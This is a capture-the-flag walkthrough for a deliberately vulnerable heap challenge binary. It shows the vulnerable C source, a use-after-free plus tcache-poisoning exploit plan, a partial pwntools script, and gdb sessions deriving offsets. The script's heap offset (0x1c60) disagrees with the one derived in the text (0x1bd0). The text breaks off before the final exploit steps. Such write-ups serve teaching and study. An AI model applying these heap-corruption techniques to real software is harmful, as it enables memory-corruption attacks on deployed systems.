# Solution

So this will be a walkthrough, one way to solve this challenge. There are definitely a ton of different ways you can solve this challenge.

One thing to note. In the solution script, there are a lot of hard coded offsets. These offsets pertain to a binary generated from compiling the source code. If you recompile the binary (which you likely will have to), those offsets will change. However, I will show you how to get all of those offsets.

## Looking at the program

So let's first understand what this program is, what we can do, and what bugs we have.

Looking at the main function, we see it's basically a menu, allowing us to do `0x06` different things. We also see the `get_uint` basically just scans in an unsigned integer. We also see the `you_win` function we have to call in order to solve this challenge:

```
void main(void) {
    unsigned int menu_choice;

    while (1 == 1) {
   	 puts("Menu:\n1.) Allocate New Chunk\n2.) View Chunk\n3.) Edit Chunk\n4.) Free Chunk\n5.) Remove Chunk\n");
   	 puts("Please enter menu choice:");
   	 menu_choice = get_uint();

   	 if (menu_choice == ALLOCATE) {
   		 allocate_chunk();
   	 }

   	 else if (menu_choice == VIEW) {
   		 view_chunk();
   	 }

   	 else if (menu_choice == EDIT) {
   		 edit_chunk();
   	 }

   	 else if (menu_choice == FREE) {
   		 free_chunk();
   	 }

   	 else if (menu_choice == REMOVE) {
   		 remove_chunk();
   	 }   	 

   	 else if (menu_choice == SECRET) {
   		 secret();
   	 }   	 

   	 else {
   		 printf("Unknown Menu Choice: %d\n", menu_choice);    
   	 }
    }
}

void you_win(void) {
    puts("Call this function to win!");

    puts("\n\nYou Win\n\n");
}

unsigned int get_uint(void) {
    char buf[20];

    fgets(buf, sizeof(buf) - 1, stdin);
    puts("");
    return (unsigned int)atoi(buf);
}
```

Looking at `allocate_chunk`, we see it asks us for a chunk size, checks it's within an allowed range, and a chunk index. Assuming those chunks pass, it will allocate a chunk of that size. It will store both the chunk, and the chunk size, in global variables `chunks/chunk_sizes`.

On Top of that, we see the helper function `get_chunk_idx`:

```
char *chunks[10];
unsigned int chunk_sizes[10];

 . . .

unsigned int get_chunk_idx(void) {
    unsigned chunk_idx;
    char *chunk;

    puts("Which chunk idx would you like?");
    chunk_idx = get_uint();


    if ((chunk_idx <= MAX_CHUNK_IDX)) {
   	 printf("You choose idx: %u\n\n", chunk_idx);
    }

    else {
   	 puts("Bad Chunk IDX\n");
   	 return -1;
    }

    chunk = chunks[chunk_idx];

    if (chunk == NULL) {
   	 puts("Chunk doesn't exist.\n");
   	 return -1;
    }

    else {
   	 return chunk_idx;
    }

}

void allocate_chunk(void) {
    unsigned int new_chunk_size, chunk_idx;
    char *new_chunk;

    puts("Allocating a new chunk!\n");

    printf("Enter the chunk size between 0x%x-0x%x:\n",
   	 MIN_CHUNK_SIZE, MAX_CHUNK_SIZE);

    new_chunk_size = get_uint();

    if ((new_chunk_size > MIN_CHUNK_SIZE) && (new_chunk_size < MAX_CHUNK_SIZE)) {
   	 printf("Chunk Size: 0x%x\n\n", new_chunk_size);
    }

    else {
   	 puts("You have inputed a bad chunks size.\n");
   	 return;
    }

    puts("Which chunk spot would you like to allocate?");
    chunk_idx = get_uint();

    if ((chunk_idx < MAX_CHUNK_IDX)) {
   	 printf("Choosen chunk idx: 0x%x\n\n", chunk_idx);
    }

    else {
   	 puts("Bad Chunk IDX\n");
   	 return;
    }

    if (chunks[chunk_idx] != NULL) {
   	 puts("Chunk already exists there!\n");
   	 return;
    }

    new_chunk = malloc(new_chunk_size);
    chunks[chunk_idx] = new_chunk;
    chunk_sizes[chunk_idx] = new_chunk_size;

    puts("Chunk has been allocated!\n");

}
```

Looking at `view_chunk`, it basically just prompts us for a chunk index, then prints the contents of that chunk as a string (assuming it passes all of the checks):

```
void view_chunk(void) {
    unsigned int chunk_idx;
    char *chunk;

    puts("Viewing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
   	 puts("Your chunk idx is invalid.\n");
   	 return;
    }

    chunk = chunks[chunk_idx];

    printf("Chunk Contents: %s\x0d\x0a\n", chunk);
}
```

Next up we see the `edit_chunk` function. This function will prompt us for a chunk that has been allocate, and allow us to write data to the chunk that corresponds with the size of the chunk:

```
void edit_chunk(void) {
    unsigned int chunk_idx, chunk_size;
    char *chunk;

    puts("Editing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
   	 puts("Your chunk idx is invalid.\n");
   	 return;
    }

    chunk = chunks[chunk_idx];
    chunk_size = chunk_sizes[chunk_idx];

    puts("Please input new chunk content:\n");

    fgets(chunk, chunk_size, stdin);

    puts("\nChunk has been edited!\n");
}
```

Here we see, we can free an allocated chunk. Note that after we free the chunk, it doesn't clear out the pointer. As such, we can use a freed pointer. This is a use after free bug:

```
void free_chunk(void) {
    unsigned int chunk_idx;
    char *chunk;

    puts("Freeing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
   	 puts("Your chunk idx is invalid.\n");
   	 return;
    }

    chunk = chunks[chunk_idx];
    free(chunk);

    puts("Chunk has been freed!\n");
}
```

This option will actually allow us to clear out a ptr:

```
void remove_chunk(void) {
    unsigned int chunk_idx;

    puts("Removing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
   	 puts("Your chunk idx is invalid.\n");
   	 return;
    }

    chunks[chunk_idx] = NULL;
    chunk_sizes[chunk_idx] = 0x00;

    puts("Chunk has been removed!\n");
}
```

This is an interesting function right here. it will basically write to a chunk, either the address of a stack variable, or PIE address. This will be helpful, since it will allow us to view either a stack, or pie address.

```
void secret(void) {
    unsigned int chunk_idx, choice;
    char *chunk;
    char buf[20];

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
   	 puts("Your chunk idx is invalid.");
   	 return;
    }

    chunk = chunks[chunk_idx];

    puts("Choice?");

    fgets(buf, sizeof(buf) - 1, stdin);
    choice = (unsigned int)atoi(buf);

    if (choice == 0xd3) {
   	 *((unsigned int **)chunk) = (&choice);
    }

    else if (choice == 0x83) {
   	 *((void (**)(void))chunk) = (&secret);
    }
}
```

## How will we pwn this?

So looking over the things we can do:
    *    We have a maximum of 10 chunks
    *    We can request chunks, of sizes 0x000-0x5f0
    *    We can free those chunks
   	*    freed ptrs not erased, use after free
    *    View contents of chunks
    *    Write to chunks, size of the allocation
    *    Write either a stack, or pie address to a chunk

And just to reiterate. Our goal is to call the `you_win` function. This is how we will do it.

In order to do what we need to, we will need to break ASLR in the heap, stack, and pie. This is because we will need to know addresses in all of those memory regions. By leaking an address to something we know in those memory regions, we can break ASLR. This is because while the addresses in a memory region will be randomized every time the program runs, the offsets between things in that memory region will not be randomized. So we can get the offsets, get a memory leak, and then calculate the addresses for things we need.

So, in order to get the stack/pie infoleaks. We will simply use the `secret` function, then view the contents. That will give us the stack/pie infoleaks.

Then to get the heap infoleak, we will leverage the use after free. We will free two large bin sized chunks, to insert them into the unsorted bin. Then we will just view the `fwd` pointer for the second chunk, which will give us a heap address. That will allow us to break ASLR in the heap.

Now for the next step. The `chunks` array is stored in the PIE segment. We will get `malloc` to allocate a ptr there. Then, we can overwrite the chunk ptrs there. This will straight up enable us to read/write to any address we want to.

Now, to get `malloc` to allocate a ptr to `chunks`. We will do so via the tcache linked list. We will allocate, and free a tcache sized chunk to insert it into the tcache. Then we will use the UAF to write a mangled next ptr to the tcache, so that after we allocate it, the tcache head chunk will be a ptr to the bss `chunks` array. Then, we will just allocate another chunk from the same tcache bin. This will give us a chunk that points to the `chunks` array. By overwriting just the first chunk ptr, we can easily read/write to any arbitrary location we want to.

Now as for how we will leverage our arbitrary read/write to get code execution. This actual write will take place in the `edit_chunk` function. So, we will simply overwrite the saved return address on the stack, to be the address of the `you_win` function. That way when it returns, it will call `you_win`, and this challenge will be solved.

Also one thing to note. The reason why I had the tcache linked list allocation was to `chunks`, and not the stack return address itself. The stack return address ends with an `0x8` (instead of a `0x0`), so it isn't aligned, and will fail checks.

## Walkthrough

So, we have already reviewed how we will get the three infoleaks we need, which will be done so with this code (you can find the I/O wrappers below for functions like `allocate_new_chunk`):

```
target = process("./chall-00")
gdb.attach(target)

. . .

allocate_new_chunk(0x500, 0)
allocate_new_chunk(0x80, 2)
allocate_new_chunk(0x500, 1)
allocate_new_chunk(0x80, 3)

secret(0x00, STACK_CHOICE)
chunk_contents = view_chunk(0)
stack_leak_contents = chunk_contents[0:6]
stack_leak = u64(stack_leak_contents + b"\x00"*2)

secret(0x00, PIE_CHOICE)
chunk_contents = view_chunk(0)
pie_leak_contents = chunk_contents[0:6]
pie_leak = u64(pie_leak_contents + b"\x00"*2)

free_chunk(0)
free_chunk(1)

chunk_contents = view_chunk(1)
heap_leak_contents = chunk_contents[0:6]
heap_leak = u64(heap_leak_contents + b"\x00"*2)

heap_base = heap_leak - 0x16b0
pie_base = pie_leak - 0x173d

win_address = pie_base + 0x12d0
edit_ret_address = stack_leak + 0x38
chunks_address = pie_base + 0x4040
tcache_chunk_address = heap_base + 0x1c60

mangled_next = (tcache_chunk_address >> 12) ^ chunks_address

print("Stack Leak is: " + hex(stack_leak))
print("Heap Leak is: " + hex(heap_leak))
print("PIE Leak is: " + hex(pie_leak))

target.interactive()
```

As for how we will find the offsets. These next parts, we will be switching between python3/gdb, while using them at the same time. As you probably know, pwntools gives us the option of attaching a debugger to the running process. To pause the debugger so we can use it, we can just type `Ctrl + C` in its window. To continue execution, we can just enter in the `c` (continue) command into gdb:

GDB:
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x000056274cf42000 0x000056274cf43000 0x0000000000000000 r-- /Hackery/shogun/challs/00/chall-00
0x000056274cf43000 0x000056274cf44000 0x0000000000001000 r-x /Hackery/shogun/challs/00/chall-00
0x000056274cf44000 0x000056274cf45000 0x0000000000002000 r-- /Hackery/shogun/challs/00/chall-00
0x000056274cf45000 0x000056274cf46000 0x0000000000002000 r-- /Hackery/shogun/challs/00/chall-00
0x000056274cf46000 0x000056274cf47000 0x0000000000003000 rw- /Hackery/shogun/challs/00/chall-00
0x000056274e78b000 0x000056274e7ac000 0x0000000000000000 rw- [heap]
0x00007fd6ff400000 0x00007fd6ff422000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fd6ff422000 0x00007fd6ff572000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fd6ff572000 0x00007fd6ff5c8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fd6ff5c8000 0x00007fd6ff5c9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fd6ff5c9000 0x00007fd6ff62c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fd6ff62c000 0x00007fd6ff62e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fd6ff62e000 0x00007fd6ff63b000 0x0000000000000000 rw-
0x00007fd6ff763000 0x00007fd6ff768000 0x0000000000000000 rw-
0x00007fd6ff768000 0x00007fd6ff769000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007fd6ff769000 0x00007fd6ff78f000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007fd6ff78f000 0x00007fd6ff799000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007fd6ff79a000 0x00007fd6ff79c000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007fd6ff79c000 0x00007fd6ff79e000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffd0f0ae000 0x00007ffd0f0cf000 0x0000000000000000 rw- [stack]
0x00007ffd0f1f0000 0x00007ffd0f1f4000 0x0000000000000000 r-- [vvar]
0x00007ffd0f1f4000 0x00007ffd0f1f6000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤  p you_win
$1 = {<text variable, no debug info>} 0x56274cf432d0 <you_win>
```

Python3:
```
$    python3 solve-00.py
[+] Starting local process './chall-00': pid 112047
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall-00', '112047']
[+] Waiting for debugger: Done
Stack Leak is: 0x7ffd0f0cddb0
Heap Leak is: 0x56274e78c6b0
PIE Leak is: 0x56274cf4373d
[*] Switching to interactive mode

Menu:
1.) Allocate New Chunk
2.) View Chunk
3.) Edit Chunk
4.) Free Chunk
5.) Remove Chunk

Please enter menu choice:
$  
```

So we see that the heap base is at `0x000056274e78b000`, and the PIE base is at `0x000056274cf42000`. We also see that the address of `you_win` is at `0x56274cf432d0`. Since our PIE leak in this instance is `0x56274cf4373d`, we have to subtract `0x56274cf4373d - 0x000056274cf42000 = 0x173d` from the PIE leak in order to get the pie base, then add `0x12d0` to the pie base in order to get the address of `you_win`.

For the heap base, we see that we just have to subtract `0x56274e78c6b0 - 0x000056274e78b000 = 0x16b0` from our heap infoleak, in order to get the heap base. As for the heap address we want to know. We will need to know the address of the tcache chunk which we want to overwrite the next ptr of, for the tcache linked list primitive. This is because of the tcache next ptr mangling where:

```
next_ptr = ((address_of_chunk >> 12) ^ (address_of_next_chunk))
```

To know what tcache chunk we will use, I'll explain what the next steps of my exploit were. I would free chunks at indices `3`, then `2`, then overwrite the next ptr of `2` (important that we free at least two tcache chunks for our tcache bin, that way the tcache count will be large enough to allocate 2 chunks from it). So we will need to know the address of chunk `2`

GDB:
```
gef➤  c
Continuing.
^C
Program received signal SIGINT, Interrupt.
0x00007fd6ff4f4951 in __GI___libc_read (fd=0x0, buf=0x56274e78b6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26      return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007fd6ff62cac0  →  0x00000000fbad2088
$rcx   : 0x00007fd6ff4f4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000       	 
$rsp   : 0x00007ffd0f0cdcd8  →  0x00007fd6ff47a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007fd6ff5cb430  →  0x0000000000000000
$rsi   : 0x000056274e78b6b0  →  "2\n1\n\n"
$rdi   : 0x0          	 
$rip   : 0x00007fd6ff4f4951  →  0x5777fffff0003d48 ("H="?)
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x49dcfe4cd1b8edbd
$r11   : 0x246        	 
$r12   : 0x00007fd6ff62cac0  →  0x00000000fbad2088
$r13   : 0x00007fd6ff5cb2e0  →  0x0000000000000000
$r14   : 0x00007ffd0f0cddc0  →  0x0000000000000000
$r15   : 0x12         	 
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd0f0cdcd8│+0x0000: 0x00007fd6ff47a071  →  <__GI__IO_file_underflow+353> test rax, rax     ← $rsp
0x00007ffd0f0cdce0│+0x0008: 0x00007fd6ff62cac0  →  0x00000000fbad2088
0x00007ffd0f0cdce8│+0x0010: 0x00007fd6ff5cb430  →  0x0000000000000000
0x00007ffd0f0cdcf0│+0x0018: 0x00007fd6ff62cac0  →  0x00000000fbad2088
0x00007ffd0f0cdcf8│+0x0020: 0x000056274e78b6b2  →  0x00000000000a0a31 ("1\n\n"?)
0x00007ffd0f0cdd00│+0x0028: 0x00007ffd0f0cddc0  →  0x0000000000000000
0x00007ffd0f0cdd08│+0x0030: 0x00007fd6ff47c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007ffd0f0cdd10│+0x0038: 0x000056274e78b2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7fd6ff4f494b <read+11>    	je 	0x7fd6ff4f4960 <__GI___libc_read+32>
   0x7fd6ff4f494d <read+13>    	xor	eax, eax
   0x7fd6ff4f494f <read+15>    	syscall
 → 0x7fd6ff4f4951 <read+17>    	cmp	rax, 0xfffffffffffff000
   0x7fd6ff4f4957 <read+23>    	ja 	0x7fd6ff4f49b0 <__GI___libc_read+112>
   0x7fd6ff4f4959 <read+25>    	ret    
   0x7fd6ff4f495a <read+26>    	nop	WORD PTR [rax+rax*1+0x0]
   0x7fd6ff4f4960 <read+32>    	sub	rsp, 0x28
   0x7fd6ff4f4964 <read+36>    	mov	QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
 	21    
 	22     /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
 	23     ssize_t
 	24     __libc_read (int fd, void *buf, size_t nbytes)
 	25     {
 →   26   	return SYSCALL_CANCEL (read, fd, buf, nbytes);
 	27     }
 	28     libc_hidden_def (__libc_read)
 	29    
 	30     libc_hidden_def (__read)
 	31     weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-00", stopped 0x7fd6ff4f4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7fd6ff4f4951 → __GI___libc_read(fd=0x0, buf=0x56274e78b6b0, nbytes=0x1000)
[#1] 0x7fd6ff47a071 → _IO_new_file_underflow(fp=0x7fd6ff62cac0 <_IO_2_1_stdin_>)
[#2] 0x7fd6ff47c23f → __GI__IO_default_uflow(fp=0x7fd6ff62cac0 <_IO_2_1_stdin_>)
[#3] 0x7fd6ff46f52c → __GI__IO_getline_info(fp=0x7fd6ff62cac0 <_IO_2_1_stdin_>, buf=0x7ffd0f0cddc0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7fd6ff46f62c → __GI__IO_getline(fp=0x7fd6ff62cac0 <_IO_2_1_stdin_>, buf=0x7ffd0f0cddc0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7fd6ff46e2ee → _IO_fgets(buf=0x7ffd0f0cddc0 "", n=0x13, fp=0x7fd6ff62cac0 <_IO_2_1_stdin_>)
[#6] 0x56274cf4332c → get_uint()
[#7] 0x56274cf4323d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=1] ←  Chunk(addr=0x56274e78cbd0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Fastbins for arena at 0x7fd6ff62cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7fd6ff62cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x56274e78cc50, bk=0x56274e78c6b0
 →   Chunk(addr=0x56274e78cc60, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x56274e78c6c0, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7fd6ff62cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7fd6ff62cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  
```

Python3
```
$ 4

Freeing a chunk!

Which chunk idx would you like?
$ 2

You choose idx: 2

Chunk has been freed!

Menu:
1.) Allocate New Chunk
2.) View Chunk
3.) Edit Chunk
4.) Free Chunk
5.) Remove Chunk

Please enter menu choice:
$  

```

So we see here, we just have to add `0x56274e78cbd0 - 0x000056274e78b000 = 0x1bd0` to our heap base, in order to get the address of the tcache chunk we need (index `2`).

The last thing we will need is the stack offset. Now for this, I'm not calculating the stack base. I found it simpler to instead, just find the offset from the stack infoleak, to the saved return address of the `edit` function. For this, I just had to break in the edit function, then do the math:


GDB:
```
gef➤  disas edit_chunk
Dump of assembler code for function edit_chunk:
   0x000056274cf435aa <+0>:    endbr64
   0x000056274cf435ae <+4>:    push   rbp
   0x000056274cf435af <+5>:    mov	rbp,rsp
   0x000056274cf435b2 <+8>:    sub	rsp,0x10
   0x000056274cf435b6 <+12>:    lea	rax,[rip+0xca6]    	# 0x56274cf44263
   0x000056274cf435bd <+19>:    mov	rdi,rax
   0x000056274cf435c0 <+22>:    call   0x56274cf430c0 <puts@plt>
   0x000056274cf435c5 <+27>:    call   0x56274cf4335d <get_chunk_idx>
   0x000056274cf435ca <+32>:    mov	DWORD PTR [rbp-0x10],eax
   0x000056274cf435cd <+35>:    cmp	DWORD PTR [rbp-0x10],0xffffffff
   0x000056274cf435d1 <+39>:    jne	0x56274cf435e4 <edit_chunk+58>
   0x000056274cf435d3 <+41>:    lea	rax,[rip+0xc57]    	# 0x56274cf44231
   0x000056274cf435da <+48>:    mov	rdi,rax
   0x000056274cf435dd <+51>:    call   0x56274cf430c0 <puts@plt>
   0x000056274cf435e2 <+56>:    jmp	0x56274cf4364c <edit_chunk+162>
   0x000056274cf435e4 <+58>:    mov	eax,DWORD PTR [rbp-0x10]
   0x000056274cf435e7 <+61>:    lea	rdx,[rax*8+0x0]
   0x000056274cf435ef <+69>:    lea	rax,[rip+0x2a4a]    	# 0x56274cf46040 <chunks>
   0x000056274cf435f6 <+76>:    mov	rax,QWORD PTR [rdx+rax*1]
   0x000056274cf435fa <+80>:    mov	QWORD PTR [rbp-0x8],rax
   0x000056274cf435fe <+84>:    mov	eax,DWORD PTR [rbp-0x10]
   0x000056274cf43601 <+87>:    lea	rdx,[rax*4+0x0]
   0x000056274cf43609 <+95>:    lea	rax,[rip+0x2a90]    	# 0x56274cf460a0 <chunk_sizes>
   0x000056274cf43610 <+102>:    mov	eax,DWORD PTR [rdx+rax*1]
   0x000056274cf43613 <+105>:    mov	DWORD PTR [rbp-0xc],eax
   0x000056274cf43616 <+108>:    lea	rax,[rip+0xc5b]    	# 0x56274cf44278
   0x000056274cf4361d <+115>:    mov	rdi,rax
   0x000056274cf43620 <+118>:    call   0x56274cf430c0 <puts@plt>
   0x000056274cf43625 <+123>:    mov	rdx,QWORD PTR [rip+0x29f4]    	# 0x56274cf46020 <stdin@GLIBC_2.2.5>
   0x000056274cf4362c <+130>:    mov	ecx,DWORD PTR [rbp-0xc]
   0x000056274cf4362f <+133>:    mov	rax,QWORD PTR [rbp-0x8]
   0x000056274cf43633 <+137>:    mov	esi,ecx
   0x000056274cf43635 <+139>:    mov	rdi,rax
   0x000056274cf43638 <+142>:    call   0x56274cf430f0 <fgets@plt>
   0x000056274cf4363d <+147>:    lea	rax,[rip+0xc55]    	# 0x56274cf44299
   0x000056274cf43644 <+154>:    mov	rdi,rax
   0x000056274cf43647 <+157>:    call   0x56274cf430c0 <puts@plt>
   0x000056274cf4364c <+162>:    leave  
   0x000056274cf4364d <+163>:    ret    
End of assembler dump.
gef➤  b *edit_chunk+139
Breakpoint 1 at 0x56274cf43635
gef➤  c
Continuing.

Breakpoint 1, 0x000056274cf43635 in edit_chunk ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000056274e78c6c0  →  0x00007fd6ff62cd00  →  0x000056274e78d1f0  →  0x0000000000000000
$rbx   : 0x0          	 
$rcx   : 0x500        	 
$rdx   : 0x00007fd6ff62cac0  →  0x00000000fbad2088
$rsp   : 0x00007ffd0f0cddd0  →  0x0000050000000000
$rbp   : 0x00007ffd0f0cdde0  →  0x00007ffd0f0cde00  →  0x0000000000000001
$rsi   : 0x500        	 
$rdi   : 0x00007fd6ff62e8f0  →  0x0000000000000000
$rip   : 0x000056274cf43635  →  <edit_chunk+139> mov rdi, rax
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x00007ffd0f0cdb67  →  0x007fd6ff44f2b200
$r11   : 0x202        	 
$r12   : 0x00007ffd0f0cdf18  →  0x00007ffd0f0ce486  →  "./chall-00"
$r13   : 0x000056274cf43209  →  <main+0> endbr64
$r14   : 0x000056274cf45d80  →  0x000056274cf431c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007fd6ff79c020  →  0x00007fd6ff79d2e0  →  0x000056274cf42000  →   jg 0x56274cf42047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd0f0cddd0│+0x0000: 0x0000050000000000     ← $rsp
0x00007ffd0f0cddd8│+0x0008: 0x000056274e78c6c0  →  0x00007fd6ff62cd00  →  0x000056274e78d1f0  →  0x0000000000000000
0x00007ffd0f0cdde0│+0x0010: 0x00007ffd0f0cde00  →  0x0000000000000001     ← $rbp
0x00007ffd0f0cdde8│+0x0018: 0x000056274cf43274  →  <main+107> jmp 0x56274cf43215 <main+12>
0x00007ffd0f0cddf0│+0x0020: 0x0000000000000000
0x00007ffd0f0cddf8│+0x0028: 0x00000003ff784080
0x00007ffd0f0cde00│+0x0030: 0x0000000000000001
0x00007ffd0f0cde08│+0x0038: 0x00007fd6ff423fbd  →  <__libc_start_call_main+109> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x56274cf4362c <edit_chunk+130> mov	ecx, DWORD PTR [rbp-0xc]
   0x56274cf4362f <edit_chunk+133> mov	rax, QWORD PTR [rbp-0x8]
   0x56274cf43633 <edit_chunk+137> mov	esi, ecx
 → 0x56274cf43635 <edit_chunk+139> mov	rdi, rax
   0x56274cf43638 <edit_chunk+142> call   0x56274cf430f0 <fgets@plt>
   0x56274cf4363d <edit_chunk+147> lea	rax, [rip+0xc55]    	# 0x56274cf44299
   0x56274cf43644 <edit_chunk+154> mov	rdi, rax
   0x56274cf43647 <edit_chunk+157> call   0x56274cf430c0 <puts@plt>
   0x56274cf4364c <edit_chunk+162> leave  
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-00", stopped 0x56274cf43635 in edit_chunk (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56274cf43635 → edit_chunk()
[#1] 0x56274cf43274 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  i f
Stack level 0, frame at 0x7ffd0f0cddf0:
 rip = 0x56274cf43635 in edit_chunk; saved rip = 0x56274cf43274
 called by frame at 0x7ffd0f0cde10
 Arglist at 0x7ffd0f0cdde0, args:
 Locals at 0x7ffd0f0cdde0, Previous frame's sp is 0x7ffd0f0cddf0
 Saved registers:
  rbp at 0x7ffd0f0cdde0, rip at 0x7ffd0f0cdde8
```

Python3
```
Menu:
1.) Allocate New Chunk
2.) View Chunk
3.) Edit Chunk
4.) Free Chunk
5.) Remove Chunk

Please enter menu choice:
$ 3

Editing a chunk!

Which chunk idx would you like?
$ 0

You choose idx: 0

Please input new chunk content:

```

So we see here, we just have to add `0x7ffd0f0cdde8 - 0x7ffd0f0cddb0 = 0x38` to our stack infoleak, to get the address of the saved return address of `edit_chunk`. The last thing we need to know, is the offset of `chunks`:

GDB:
```
gef➤  p (char *)chunks
$2 = 0x56274e78c6c0 ""
gef➤  vmmap 0x56274e78c6c0
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x000056274e78b000 0x000056274e7ac000 0x0000000000000000 rw- [heap]
gef➤  search-pattern 0x56274e78c6c0
[+] Searching '\xc0\xc6\x78\x4e\x27\x56' in memory
[+] In '/Hackery/shogun/challs/00/chall-00'(0x56274cf46000-0x56274cf47000), permission=rw-
  0x56274cf46040 - 0x56274cf46058  →   "\xc0\xc6\x78\x4e\x27\x56[...]"
[+] In '[stack]'(0x7ffd0f0ae000-0x7ffd0f0cf000), permission=rw-
  0x7ffd0f0cdd10 - 0x7ffd0f0cdd28  →   "\xc0\xc6\x78\x4e\x27\x56[...]"
  0x7ffd0f0cdd48 - 0x7ffd0f0cdd60  →   "\xc0\xc6\x78\x4e\x27\x56[...]"
  0x7ffd0f0cdd78 - 0x7ffd0f0cdd90  →   "\xc0\xc6\x78\x4e\x27\x56[...]"
  0x7ffd0f0cddd8 - 0x7ffd0f0cddf0  →   "\xc0\xc6\x78\x4e\x27\x56[...]"
gef➤  x/g 0x56274cf46040
0x56274cf46040 <chunks>:    0x56274e78c6c0
gef➤  x/20g 0x56274cf46040
0x56274cf46040 <chunks>:    0x56274e78c6c0    0x56274e78cc60
0x56274cf46050 <chunks+16>:    0x56274e78cbd0    0x56274e78d170
0x56274cf46060 <chunks+32>:    0x0    0x0
0x56274cf46070 <chunks+48>:    0x0    0x0
0x56274cf46080 <chunks+64>:    0x0    0x0
0x56274cf46090:    0x0    0x0
0x56274cf460a0 <chunk_sizes>:    0x50000000500    0x8000000080
0x56274cf460b0 <chunk_sizes+16>:    0x0    0x0
0x56274cf460c0 <chunk_sizes+32>:
```

So here, we see that the offset from the base of the pie memory region to `chunks` is `0x56274cf46040 - 0x000056274cf42000 = 0x4040`.

So, we have all of the offsets we need to. Just to recap, these are the steps our exploit will take:
